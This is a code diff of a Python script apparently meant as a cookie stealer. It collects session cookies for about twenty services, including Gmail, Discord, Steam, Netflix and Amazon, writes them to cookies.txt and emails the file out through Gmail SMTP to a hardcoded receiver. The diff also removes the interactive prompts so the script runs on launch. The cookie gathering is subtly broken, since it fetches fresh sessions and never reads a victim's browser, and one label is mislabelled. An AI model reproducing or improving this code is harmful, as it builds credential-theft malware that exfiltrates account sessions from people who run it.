@@ -6,36 +6,145 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 
-def main():
-    url = input("Type here the url of the cookie jar!: ")
-    s = requests.session()
-    s.get(url)
-    cookies = s.cookies.get_dict()
-    with open('cookies.txt', 'w') as f:
-        f.write(str(cookies))
+time.sleep(2)
 
-def send():
+def main():
+    #getting cookies and storing them in a variable
+
+    y_url = "https://www.youtube.com"
+    s = requests.session()
+    s.get(y_url)
+    y_cookies = s.cookies.get_dict()
+
+    i_url = "https://www.instagram.com"
+    s.get(i_url)
+    i_cookies = s.cookies.get_dict()
+    
+    t_url = "https://www.twitch.tv"
+    s.get(t_url)
+    t_cookies = s.cookies.get_dict()
+
+    tw_url = "https://twitter.com"
+    s.get(tw_url)
+    tw_cookies = s.cookies.get_dict()
+
+    gh_url = "https://github.com"
+    s.get(gh_url)
+    gh_cookies = s.cookies.get_dict()
+
+    gm_url = "https://mail.google.com"
+    s.get(gm_url)
+    gm_cookies = s.cookies.get_dict()
+
+    s_url = "https://store.steampowered.com"
+    s.get(s_url)
+    s_cookies = s.cookies.get_dict()
+
+    dc_url = "https://discord.com"
+    s.get(dc_url)
+    dc_cookies = s.cookies.get_dict()
+
+    fc_url = "https://www.facebook.com"
+    s.get(fc_url)
+    fc_cookies = s.cookies.get_dict()
+
+    vk_url = "https://vk.com"
+    s.get(vk_url)
+    vk_cookies = s.cookies.get_dict()
+
+    wp_url = "https://web.whatsapp.com"
+    s.get(wp_url)
+    wp_cookies = s.cookies.get_dict()
+    
+    hbo_url = "https://www.hbomax.com"
+    s.get(hbo_url)
+    hbo_cookies = s.cookies.get_dict()
+
+    dp_url = "https://www.disneyplus.com"
+    s.get(dp_url)
+    dp_cookies = s.cookies.get_dict()
+
+    n_url = "https://www.netflix.com"
+    s.get(n_url)
+    n_cookies = s.cookies.get_dict()
+
+    r_url = "https://www.reddit.com"
+    s.get(r_url)
+    r_cookies = s.cookies.get_dict()
+
+    amz_url = "https://www.amazon.com"
+    s.get(amz_url)
+    amz_cookies = s.cookies.get_dict()
+
+    spf_url = "https://www.shopify.com"
+    s.get(spf_url)
+    spf_cookies = s.cookies.get_dict()
+
+    spr_url = "https://www.shopier.com"
+    s.get(spr_url)
+    spr_cookies = s.cookies.get_dict()
+
+    sptfy_url = "https://open.spotify.com"
+    s.get(sptfy_url)
+    sptfy_cookies = s.cookies.get_dict()
+
+    ptrst_url = "https://www.pinterest.com/"
+    s.get(ptrst_url)
+    ptrst_cookies = s.cookies.get_dict()
+
+    #writing cookies in "cookies.txt"
+
+    with open('cookies.txt', 'w') as f:
+        f.write(str(f"youtube: {y_cookies}\n"))
+        f.write(str(f"instagram: {i_cookies}\n"))
+        f.write(str(f"twitch: {t_cookies}\n"))
+        f.write(str(f"twitter: {tw_cookies}\n"))
+        f.write(str(f"github: {gh_cookies}\n"))
+        f.write(str(f"gmail: {gm_cookies}\n"))
+        f.write(str(f"steam: {s_cookies}\n"))
+        f.write(str(f"discord: {dc_cookies}\n"))
+        f.write(str(f"facebook: {fc_cookies}\n"))
+        f.write(str(f"vk: {vk_cookies}\n"))
+        f.write(str(f"whatsapp: {wp_cookies}\n"))
+        f.write(str(f"hbo: {hbo_cookies}\n"))
+        f.write(str(f"disney+: {dp_cookies}\n"))
+        f.write(str(f"netflix: {n_cookies}\n"))
+        f.write(str(f"reddit: {r_cookies}\n"))
+        f.write(str(f"amazon: {amz_cookies}\n"))
+        f.write(str(f"shopify: {spf_cookies}\n"))
+        f.write(str(f"shopier: {spr_cookies}\n"))
+        f.write(str(f"spotify: {sptfy_cookies}\n"))
+        f.write(str(f"spotify: {ptrst_cookies}\n"))
+
+    #setting smtp server
+
     smtp_port = 587                 
     smtp_server = "smtp.gmail.com"  
 
-    email_from = input("Type here your mail: ")
-    x = input("Type here the receiver mail: ")
+    #setting senders/receivers and account information
+
+    email_from = "Type here your mail"
+    x = "Type here the receiver mail"
     email_list = [x]
 
-    pswd = input("Type here the app password of your account: ")
+    pswd = "Type here the app password of your account"
+
+    #creating mail content
 
     subject = "cookies"
 
-    def send_emails(email_list):
+    def mail(email_list):
 
         for person in email_list:
             body = f"""
-            Here is my precious cookies!
+            cookies
             """
             msg = MIMEMultipart()
             msg['From'] = email_from
             msg['To'] = person
             msg['Subject'] = subject
+
+            #attaching file
 
             msg.attach(MIMEText(body, 'plain'))
 
@@ -51,6 +160,8 @@ def send():
 
             text = msg.as_string()
 
+            #sending cookies via gmail
+
             TIE_server = smtplib.SMTP(smtp_server, smtp_port)
             TIE_server.starttls()
             TIE_server.login(email_from, pswd)
@@ -63,32 +174,9 @@ def send():
 
         TIE_server.quit()
 
-    send_emails(email_list)
+    #calling send mail function
 
-def quit():
-    print("Cookie Monster is sad now :(")
-    exit(0)
+    mail(email_list)
 
-while True:
-    f = input("> ")
-
-    if f == "cookies":
-        print("Awakening the Cookie Monster...")
-        time.sleep(2)
-        main()
-    
-    elif f == "send--":
-        print("Packing cookies...")
-        time.sleep(2)
-        send()
-        
-    elif f == "q":
-        quit()
-
-    elif f == "!help":
-        print("""for storing cookies type cookies,
-for mailing cookies to yourself type send--,
-to quit type q...""")
-
-    else:
-        print("¿¿¿cookie monster can't understand what the fuck are you saying???")
+if __name__ == "__main__":
+    main()
